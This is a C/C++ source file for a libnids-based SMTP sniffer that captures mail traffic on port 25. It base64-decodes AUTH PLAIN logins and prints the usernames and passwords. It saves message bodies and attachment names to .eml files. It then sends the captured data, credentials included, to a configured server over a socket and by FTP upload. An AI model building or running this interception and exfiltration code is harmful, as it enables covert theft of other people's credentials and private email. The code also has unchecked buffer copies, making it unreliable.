/************************************************
 *Summary: capture and analyze SMTP protocol 
 *Author: ms
 *Date: 2017/3/11
 *
 *************************************************/
#define __DEBUG__  //use __TRACE__ macro
#include"Trace.h"

#define __LINUX_PLATFORM__

#ifdef __LINUX_PLATFORM__
#define SEPARATOR '/'
#endif
#ifdef __WINDOWS_PLATFORM__
#define SEPARATOR '\\'   //windows
#endif


#include"smtp_type.h"

#include"base64.h"  //use base64 decode

#include"text_tools.h"  //use text tools function

#include<curl/curl.h>  //use libcurl for ftp transfer
#include<sys/stat.h>
#include<errno.h>
#include<pthread.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<stdio.h>
#include<nids.h>
#include<stdlib.h>
#include<string.h>
#include<list>
using namespace std;

//funciton statement
int read_config_file();
//global vars
list<mail_data_type > g_mail_info_list;
config_info_type g_config_info;

#define SMTP_REQUEST_TABLES_SIZE (11)
void (*smtp_request_tables[SMTP_REQUEST_TABLES_SIZE])(list<mail_data_type >::iterator,unsigned char *,size_t);   //smtp request parser function tables

#define DATA_TABLES_SIZE (6)
void (*DATA_tables[DATA_TABLES_SIZE])(list<mail_data_type >::iterator,unsigned char *,size_t);  //DATA parser funciton tables

/*smtp request tables function*/
void ehlo_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{
	get_line(buf,size,it->hostname);
	__TRACE__("hostname:%s\n",it->hostname);
}

//the function process auth type is "auth:plain "
void auth_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{
	unsigned char auth_buf[128]={0};
	int length=get_line(buf,size,auth_buf);
	
	//get auth type
	int blank_index=find_char(auth_buf,length,' ');
	
	if(blank_index!=-1)
	{
		memcpy(it->auth_type,auth_buf,blank_index);
		it->auth_type[blank_index]='\0';
		__TRACE__("auth type:%s\n",it->auth_type);
	}

	int up_size=length-blank_index-1; //username and passwd
	//get user name
	unsigned char encoded_username_and_passwd[128]={0};
	memcpy(encoded_username_and_passwd,auth_buf+blank_index+1,up_size);
	encoded_username_and_passwd[up_size]='\0';
		
	//decode
	unsigned char decoded_username_and_passwd[128]={0};
	base64_decode(decoded_username_and_passwd,encoded_username_and_passwd,up_size);

	__TRACE__("\n%s\n",decoded_username_and_passwd);

	unsigned char * start_point=decoded_username_and_passwd+1; //this reason is what decoded_username_and_passwd's first char is '\0'

	//find '\0'
	int zero_index=find_char(start_point,up_size*3/4+1,'\0');
	if(zero_index==-1)
	{
		return;
	}

	memcpy(it->username,start_point,zero_index);
	it->username[zero_index]='\0';
	__TRACE__("username:%s\n",it->username);

	strcpy((char *)it->password,(char *)start_point+zero_index+1);  //jump username and '\0'
	__TRACE__("password:%s\n",it->password);

}
void mail_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{

	//get from
	//jump "FROM:<"
	unsigned char *begin=buf+6;
	int char_index=find_char(begin,size-5,'>');
	if(char_index==-1)
	{
		__TRACE__("SEARCH CHAR FAILED\n");
		return ;
	}
	memcpy(it->from,begin,char_index);

	__TRACE__("FROM:%s\n",it->from);
}
void rcpt_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{
	//get TO
	//jump "To:<"
	unsigned char *begin=buf+4;
	int char_index=find_char(begin,size-4,'>');
	if(char_index==-1)
	{
		__TRACE__("SEARCH CHAR FAILED\n");
		return ;
	}
	memcpy(it->sendto[it->sendto_num++],begin,char_index);

	__TRACE__("TO:%s\n",it->sendto[it->sendto_num-1]);
}
void data_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{
	//search attachemnt name in every DATA packet
	DATA_tables[ATTACHMENT_NAME](it,buf,size);

	//the state is MAIN_BODY
	if(it->data_state==MAIN_BODY)
	{
		DATA_tables[it->data_state](it,buf,size);
		return;  //no enter recycle
	}
	//search subject/date/user-agent/main_body
	for(int i=SUBJECT;i<=MAIN_BODY;++i)
	{
		DATA_tables[i](it,buf,size);
	}
}
void quit_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{
	//no code
}
void rset_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{
	//no code
}
/*end smtp request function*/

/*DATA parser function */
void subject_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{
	char * subject_str="Subject";
	unsigned char* ret_str=read_info((unsigned char *)buf,size,(unsigned char*)subject_str,it->subject);
	if(ret_str)
	{
		it->data_state=SUBJECT;
		__TRACE__("Subject:%s\n",it->subject);
	}
}
void date_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{
	char * date_str="Date";
	unsigned char *ret_str=read_info((unsigned char *)buf,size,(unsigned char *)date_str,it->date);
	if(ret_str)
	{
		it->data_state=DATE;
		__TRACE__("Date:%s\n",it->date);
	}
}
void user_agent_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{
	char * ua_str="User-Agent";
	unsigned char *ret_str=read_info((unsigned char *)buf,size,(unsigned char *)ua_str,it->user_agent);
	if(ret_str)
	{
		it->data_state=USER_AGENT;
		__TRACE__("User-Agent:%s\n",it->user_agent);
	}
}

/*************************************************************************************
 * Summary: get mail content ,save to eml file 
 * Param:
 *		it: mail_data_type 's iterator
 *		buf: receieved data
 *		size: buf;s size
 ************************************************************************************/
void save_data_to_file(FILE * fp, unsigned char * buf,size_t size)
{
	if(fp)
	{
		fwrite(buf,size,1,fp);
	}
}

/****************************************************************************************
 * Summary: main_body parser
 * Param: 
 *		it: mail_data_type 's iterator
 *		buf: receieved data
 *		size: buf's size
 ****************************************************************************************/
void main_body_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{
	FILE* fp=NULL;

	char file_path[256]={0};
	strcpy(file_path,g_config_info.eml_path);
	strcat(file_path,(char*)it->eml_file_name);

	fp=fopen(file_path,"a");
	if(fp)
	{
		save_data_to_file(fp,buf,size);
		fclose(fp);
	}

}
void attachment_name_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t size)
{

	//get mail attachment name
	char * content_disposition_str="Content-Disposition";
	char * attachment_str="attachment; filename=\"";
	int attachment_str_length=strlen(attachment_str);
	unsigned char attachment[256]={0};
	
	unsigned char *ret_str=(unsigned char *)buf;

	while(1)
	{
	    ret_str=read_info((unsigned char *)ret_str,size-(ret_str-(unsigned char *)buf),(unsigned char *)content_disposition_str,attachment);
	
		//no found ,break
	    if(!ret_str)
		{
			//__TRACE__("The Packet is Not Found Attachment\n");
			break;
		}
	    
	    printf("\nattachment:%s\n",attachment);
	    //if == attachment
	    if(strncasecmp((char *)attachment,attachment_str,strlen(attachment_str)-1)==0)
	    {
	    	//jump ":\r\n " 4chars 
	    	unsigned char * position=attachment+attachment_str_length;
	    	int index=find_char(position,strlen((char *) position),'\"');
	    	if(index==-1)
	    	{
	    		return ;
	    	}

	    	memcpy(it->attachment_name[it->attachment_num++],position,index);
	    	__TRACE__("Attachment:%s\n",it->attachment_name[it->attachment_num-1]);
	    }
	    
		
	}
}
/*end DATA parser funciton*/


int init()
{
	//read config file	
	if(read_config_file())
	{
		return -1;
	}

	//smtp request table init
	smtp_request_tables[EHLO]=ehlo_parser;
	smtp_request_tables[AUTH]=auth_parser;
	smtp_request_tables[MAIL]=mail_parser;
	smtp_request_tables[RCPT]=rcpt_parser;
	smtp_request_tables[DATA]=data_parser;
	smtp_request_tables[QUIT]=quit_parser;
	smtp_request_tables[RSET]=rset_parser;

	//DATA table init
	DATA_tables[SUBJECT]=subject_parser;
	DATA_tables[DATE]=date_parser;
	DATA_tables[USER_AGENT]=user_agent_parser;
	DATA_tables[MAIN_BODY]=main_body_parser;
	DATA_tables[ATTACHMENT_NAME]=attachment_name_parser;

}


#define int_ntoa(x) inet_ntoa(*((struct in_addr *)&x))
char * adres (struct tuple4 addr)
{
   static char buf[256];
   strcpy (buf, int_ntoa (addr.saddr));
   sprintf (buf + strlen (buf), ",%i,", addr.source);
   strcat (buf, int_ntoa (addr.daddr));
   sprintf (buf + strlen (buf), ",%i", addr.dest);
   return buf;
}

/******************************************************************
 * Summary:find element from list
 * Param:
 *		source_port:local host port	
 *Return:
 *		return matched element's iterator ,no matched return end()
 ******************************************************************/
list<mail_data_type >::iterator find_element_from_list(unsigned short source_port)
{
	list<mail_data_type >::iterator it=g_mail_info_list.begin();
	for(;it!=g_mail_info_list.end();++it)
	{
		if(it->source_port==source_port)
		{
			break;
		}
	}
	return it;
}

/************************************************
 *Summary:read smtpCap.config
 *Return:
 *		0:OK
 *		-1:Failed
 *
 ************************************************/
int read_config_file()
{
	FILE* fp=NULL;
	char buf[64];
	fp=fopen("smtpCap.config","r");
	if(!fp)
	{
		return -1;
	}

	//read server ip
	memset(buf,0,64);
	fscanf(fp,"%s",buf);
	if(strncmp(buf,"server_ip:",10)==0)
	{
		//set ftp url
		strcpy(g_config_info.ftp_url,"ftp://");
		strcat(g_config_info.ftp_url,buf+10);
		strcat(g_config_info.ftp_url,"/");

		//set server ip
		inet_pton(AF_INET,buf+10,&g_config_info.server_ip);
	}
	else
	{
		fclose(fp);
		return -1;
	}
	//read server port
	memset(buf,0,64);
	fscanf(fp,"%s",buf);
	if(strncmp(buf,"server_port:",12)==0)
	{
		g_config_info.server_port=htons((unsigned short)atoi(buf+12));
	}
	else
	{
		fclose(fp);
		return -1;
	}

	memset(buf,0,64);
	fscanf(fp,"%s",buf);
	if(strncmp(buf,"eml_path:",9)==0)
	{
		strcpy(g_config_info.eml_path,buf+9);
	}
	else
	{
		fclose(fp);
		return -1;
	}

	fclose(fp);
	return 0;
}

/*********************************************
 * Summary:read file callback for ftp upload 
 *********************************************/
size_t read_callback(void * ptr,size_t size,size_t nmemb,void * stream)
{
	curl_off_t nread;
	size_t ret_num=fread(ptr,size,nmemb,(FILE *)stream);
	nread=(curl_off_t)ret_num;
	fprintf(stderr, "*** We read %" CURL_FORMAT_CURL_OFF_T
					" bytes from file\n", nread);

	return ret_num;
}

/***************************************************************
 * Summary: transfer eml file via ftp
 * Param:
 *		eml_file_path:eml file's path
 ***************************************************************/
#define REMOTE_URL "ftp://192.168.140.1/log.txt"
void send_eml_file_to_server(char * eml_file_path,char * new_eml_file_name)
{
	CURL  * curl;
	FILE * fp=NULL;
	CURLcode res;
	curl_off_t fsize;
	struct stat file_info;
	struct curl_slist* headerlist=NULL;
	char remote_url[256]={0};
	strcpy(remote_url,g_config_info.ftp_url);
	strcat(remote_url,new_eml_file_name);

	/* get the file size of the local file */ 
	if(stat(eml_file_path, &file_info)) 
	{
		printf("Couldnt open '%s': %s\n", eml_file_path, strerror(errno));
		return ;
	}
	fsize = (curl_off_t)file_info.st_size;
	printf("Local file size: %" CURL_FORMAT_CURL_OFF_T " bytes.\n", fsize);

	fp=fopen(eml_file_path,"rb");
	if(!fp)
	{
		printf("open file faild\n");
		return ;
	}

	/* In windows, this will init the winsock stuff */ 
	curl_global_init(CURL_GLOBAL_ALL);
	   
	//easy init
	curl=curl_easy_init();
	if(!curl)
	{
		perror("curl init failed\n");
		return ;
	}

	curl_easy_setopt(curl,CURLOPT_READFUNCTION,read_callback);
	
	curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
	
	curl_easy_setopt(curl, CURLOPT_URL, remote_url);
	curl_easy_setopt(curl, CURLOPT_READDATA, fp);
	curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE,(curl_off_t)fsize);
	res = curl_easy_perform(curl);
	if(res!=CURLE_OK)
	{
		printf("curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
	}

    fclose(fp); /* close the local file */ 
    curl_global_cleanup();



	__TRACE__("send eml file successed !\n");
}

/***************************************************************
 * Summary:send data struct(mail_data_type) to server via socket
 * Param:
 *		buf:data struct's address
 *		size:buf's size
 ***************************************************************/
int send_data_to_server(void * buf,size_t size)
{
	struct sockaddr_in server_address;
	memset(&server_address,0,sizeof(server_address));
	server_address.sin_family=AF_INET;
	server_address.sin_addr.s_addr=g_config_info.server_ip;
	server_address.sin_port=g_config_info.server_port;

	int sock=socket(PF_INET,SOCK_STREAM,0);
	if(sock<0)
	{
		return 1;
	}

	if(connect(sock,(struct sockaddr *)&server_address,sizeof(server_address))<0)
	{
		__TRACE__("connection failed!\n");
		close(sock);
		return 2;
	}
	
	int ret=send(sock,buf,size,0);
	if(ret<=0)
	{
		close(sock);
		return 3;
	}
	__TRACE__("send data success\n");

	close(sock);

}

/*****************************************************************
 * Summary: thread entry
 * Param:
 *		arg: is type of (mail_data_type *) ,pointer of sended data
 *
 *****************************************************************/
void * thread_start(void * arg)
{
	//send data
	mail_data_type * p_data= (mail_data_type *)arg;	
	send_data_to_server(p_data,sizeof(mail_data_type));

	//send eml file via ftp
	char eml_file_path[256]={0};
	strcpy(eml_file_path,g_config_info.eml_path);
	strcat(eml_file_path,(char *)p_data->eml_file_name);
	//call function
	send_eml_file_to_server(eml_file_path,(char *)p_data->eml_file_name);
	//send eml file end

}

/**************************************************
 * Summary:send object & eml file to server
 * Param:
 *		it:list's iterator
 * Return:
 *		0:SUCCESS
 *		-1:Failed
 *************************************************/
int send_info_to_server(list<mail_data_type >::iterator it)
{

	int ret;
	pthread_t tid;
	if(it!=g_mail_info_list.end())
	{
		ret=pthread_create(&tid,NULL,thread_start,&(*it));
		if(ret!=0)
		{
			__TRACE__("create thread failed\n");
			return -1;
		}
		pthread_detach(tid);  
	}

	return 0;
}
/************************************************************
 *  Summary: analyze sended smtp packet from buffer
 *  param:
 *		it: g_mail_info_list's iterator
 *		buf : buf from nids server data
 *		size : data's size
 ***********************************************************/
void smtp_request_parser(list<mail_data_type >::iterator it, char * buf,size_t size)
{
	unsigned char * begin=(unsigned char *)buf;  //a pointer for parser
	unsigned char * end=NULL;
	char command[5];  //command have 4 characters
	command[4]=0;  //"C" type string '\0'

	memcpy(command,buf,4);
	begin=(unsigned char*)buf+5;   //jump command(4)+1

    if(it==g_mail_info_list.end())
	{
		return;
	}

	if(strcmp(command,"QUIT")==0)  //no use strcasecmp
	{
		it->smtp_request_state=QUIT;
	}
	else if(strcmp(command,"RSET")==0)
	{
		it->smtp_request_state=RSET;
	}
	//the next call the callback function,the state is enum"DATA"
	else if(it->smtp_request_state==DATA)
	{
		smtp_request_tables[it->smtp_request_state](it,(unsigned char *)buf,size); 
		return ;
	}
	else if(strcmp(command,"EHLO")==0)
	{
		it->smtp_request_state=EHLO;
	}
	else if(strcmp(command,"AUTH")==0)
	{
	    it->smtp_request_state=AUTH;
	}
	else if(strcmp(command,"MAIL")==0)
	{
		it->smtp_request_state=MAIL;

	}
	else if(strcmp(command,"RCPT")==0)
	{
		it->smtp_request_state=RCPT;
	}
	else if(strcmp(command,"DATA")==0)
	{
		it->smtp_request_state=DATA;
		return ;
		// no data can capture
	}
	else
	{
		//no support
		it->smtp_request_state=UNKOWN;
		return;
	}

	//transfer table
	smtp_request_tables[it->smtp_request_state](it,begin,size-5);

}

/**************************************************************
 *  Summary: analyze received smtp packet from buffer
 *  param:
 *		it-> list's iterator
 *		buf : buf from nids client data
 *		size : buf's size
 ***************************************************************/
void smtp_reply_parser(list<mail_data_type >::iterator it,char * buf,size_t size)
{
	//no use
}

//call back function
void tcp_callback(struct tcp_stream * a_tcp,void ** this_time_not_needed)
{
	char buf[1024];

	//connecting
	if(a_tcp->nids_state == NIDS_JUST_EST)
	{

		if(a_tcp->addr.dest == 25)
		{
		    //received a client and server 
		    strcpy(buf,adres(a_tcp->addr));  //get tcp connection addr info to buf
			a_tcp->client.collect++;
			a_tcp->server.collect++;
			a_tcp->server.collect_urg++;
			a_tcp->client.collect_urg++;

			__TRACE__("%s mail transport established\n",buf);

			//create a object in list recording source port
			g_mail_info_list.resize(g_mail_info_list.size()+1);

			mail_data_type& end=g_mail_info_list.back();
			end.source_port=a_tcp->addr.source;
			end.sendto_num=0;
			end.data_state=DATA_UNKOWN;
			end.smtp_request_state=UNKOWN;

			//determine new eml file
			char filename[64]={0};
			sprintf(filename,"%d",time(NULL));
			filename[strlen(filename)]='_';
			sprintf(filename+strlen(filename),"%d",(int)end.source_port);
			strcat(filename,".eml");
			strcpy((char *)end.eml_file_name,filename);
		}
		return ;
	}

	// connection has been closed 
	if(a_tcp->nids_state == NIDS_CLOSE)
	{
		__TRACE__("%s closeing\n",buf);
	
	    a_tcp->client.collect--;
	    a_tcp->server.collect--;
	    a_tcp->server.collect_urg--;
        a_tcp->client.collect_urg--;

		//find object
		list<mail_data_type >::iterator it=find_element_from_list(a_tcp->addr.source);
		
		//send object to server
        if(it!=g_mail_info_list.end())
		{
			send_info_to_server(it);
		}
		//delete object from list
		g_mail_info_list.erase(it);

		return;
	}

    // connection has been closed by RST
	if (a_tcp->nids_state == NIDS_RESET)
    {
        __TRACE__( "%s reset\n", buf);

	    a_tcp->client.collect--;
	    a_tcp->server.collect--;
	    a_tcp->server.collect_urg--;
        a_tcp->client.collect_urg--;

		//delete object from list
		list<mail_data_type >::iterator it=find_element_from_list(a_tcp->addr.source);
		g_mail_info_list.erase(it);

		return;
	}

	//receiveing data
	if(a_tcp->nids_state == NIDS_DATA)
	{
		list<mail_data_type >::iterator it=find_element_from_list(a_tcp->addr.source);
		
		if(it==g_mail_info_list.end())
		{
			return;
		}

		if(a_tcp->server.count_new_urg)
		{
			__TRACE__("server urg data\n");
			return ;
		}
		if(a_tcp->server.count_new)
		{
			//__TRACE__("send data:%s\n",a_tcp->server.data);
			__TRACE__("send data:%dbyte\n",a_tcp->server.count_new);
			smtp_request_parser(it,a_tcp->server.data,a_tcp->server.count_new);
			return ;
		}
		if(a_tcp->client.count_new_urg)
		{
			 __TRACE__("client urg data\n");
             return ;
		}
		if(a_tcp->client.count_new)
		{
		    //__TRACE__("received data:%s\n",a_tcp->client.data);	
			__TRACE__("received data:\n");	
			smtp_reply_parser(it,a_tcp->server.data,a_tcp->client.count_new);
			return ;
		}
	}
}

int main()
{
	//init
	if(init()==-1)
	{
		return -1;
	}

	in_addr addr;
	addr.s_addr=g_config_info.server_ip;
	unsigned short port;
	port=g_config_info.server_port;
	__TRACE__("server ip:%s\tserver port:%d\n",inet_ntoa(addr),ntohs(port));

	nids_params.device="eth1";

	if(!nids_init())
	{
		__TRACE__("%s\n",nids_errbuf);
		exit(1);
	}

	nids_register_tcp((void *)tcp_callback);

	nids_run();

	return 0;
}

